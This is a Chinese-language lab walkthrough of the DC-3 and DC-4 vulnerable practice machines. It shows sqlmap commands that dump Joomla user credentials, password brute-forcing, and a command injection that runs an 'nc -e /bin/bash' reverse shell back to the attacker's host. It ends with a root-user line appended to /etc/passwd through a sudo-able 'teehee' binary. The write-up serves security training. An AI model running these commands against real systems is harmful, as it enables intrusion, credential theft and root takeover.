发现这是一个sql注入的漏洞，可以可以`sqlmap`这个工具实现sql注入，不懂的可以单独搜索一下`sqlmap`这个工具。

![](img/8838f0051f3d5f9fd489ef86703c4d06.png)

```
sqlmap -u "http://192.168.102.132/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

```
sqlmap -u "http://192.168.102.132/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D "joomladb" --tables -p list[fullordering]
```

```
sqlmap -u "http://192.168.102.132/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D "joomladb" -T "#__users" --columns -p list[fullordering]
```

```
sqlmap -u "http://192.168.102.132/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D "joomladb" -T "#__users" -C "name,password,username" --dump -p list[fullordering]
```

## 【DC系列04】DC-4靶机复盘

首先`nmap`扫ip，我这里扫出来ip了，然后对这个ip做一个单独的扫描。

![](img/2f4a583d339dd4ad545b176e8fa2a9f5.png)

扫描ip的同时再扫描一下目录，其实目录并没有扫描出来一个什么，有个登陆地址但是转到主目录了。

![](img/cca4abde9d6ad6efa661bbffab7f9f6e.png)

![](img/841ed337a243163604c5bb85a103f682.png)

搜寻了一圈并没有什么好利用的点，从这个登陆框很容易看出来登陆用户名是`admin`，可以根据这个进行一个爆破，很快密码就爆破出来了，是个弱密码。

![](img/c2de4f9f0f64f64b1c681f20deb8b324.png)

![](img/b270da2889fed52210c3d8ff9f73fb96.png)

进来以后发现有个Command，点击run发现这是一个`ls`命令，所以我们就抓包看看能不能修改一下

![](img/7d9e7fbfc7e904eb2838b4e0dd6fcf99.png)

看到这里空格是用`+`号代替了，我们尝试放一个反弹shell

![](img/81452cfceb07b8e0f775a54862d3f1a6.png)

![](img/4ecc1d128b11fa8eb7e1b6407b9e6fe5.png)

```
nc -e /bin/bash 192.168.102.129 8888
```

kali这边监听一下，发现获取到了该靶机的webshell

![](img/a8ca087e8f1aa39c6365a51f47ebea5a.png)

首先使用`python`命令美化一下命令行。

```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

登陆以后在里面寻找了一下，发现在`/home/jim/backups`目录下有一个`old-passwords.bak`文件，这是一个旧密码文件，里面有很多密码，所以就猜测需要用到密码爆破。

![](img/ddc00134e3c8db8c440c1a4fcc040dd8.png)

`hydra`爆破一下`jim`用户，很快密码就出来了。

![](img/9090dda1ea1ee9b798b7c30cfa3aea82.png)

远程登陆一下`jim`用户。

![](img/9b1577b3d62646cde76fe06beaa09f8f.png)

登陆到`jim`用户后在家目录找了一圈发现并没有可以利用的东西，但是在`/var`下有个`mail`目录，这是一个邮件目录，所以这里面可能有什么邮件信息比较关键。

![](img/cd9369b4f52a4714890386961a42081d.png)

打开后发现有一个`charles`写给`jim`的邮件，里面有`charles`的密码，我们就尝试登陆一下`charles`用户。

![](img/a908e04e8ac6abee05e625bbbc98ff3a.png)

很轻松，顺利就登陆上去了。

![](img/c01c0f4813a87324792f76c0295176b2.png)

`sudo -l`一下发现在有个免密使用root权限的文件`/usr/bin/teehee`

`teehee -help`后发现这个文件执行后可以以root权限免密往另一个文件内容后追加内容，所以我们可以利用这个漏洞往`/etc/passwd`文件下追加一个root用户。

![](img/52ce99b2284fef5de28d29cfaac852d9.png)

![](img/7731a0820e9ac837c4be231fb6838ab0.png)

我们的密码追加时候需要以密文的方式追加，如果直接追加明文密码登陆时候会鉴权失败。

这个命令是针对我们的密码和用户输出一个密码的密文。

```
perl -le 'print crypt("123456", "tang6")'
```

![](img/16e48d907b4769df9c046e3aec520c67.png)

利用`sudo teehee`和`echo`命令就可以追加到`/etc/passwd`

```
echo "tang6:tarRU/F9EJjRU:0:0:root::/bin/bash" | sudo teehee -a /etc/passwd
```

`su tang6`登陆一下，密码`123456`，发现已经是root权限了。

![](img/4d0d30e5e1a936f01a0835be23103573.png)
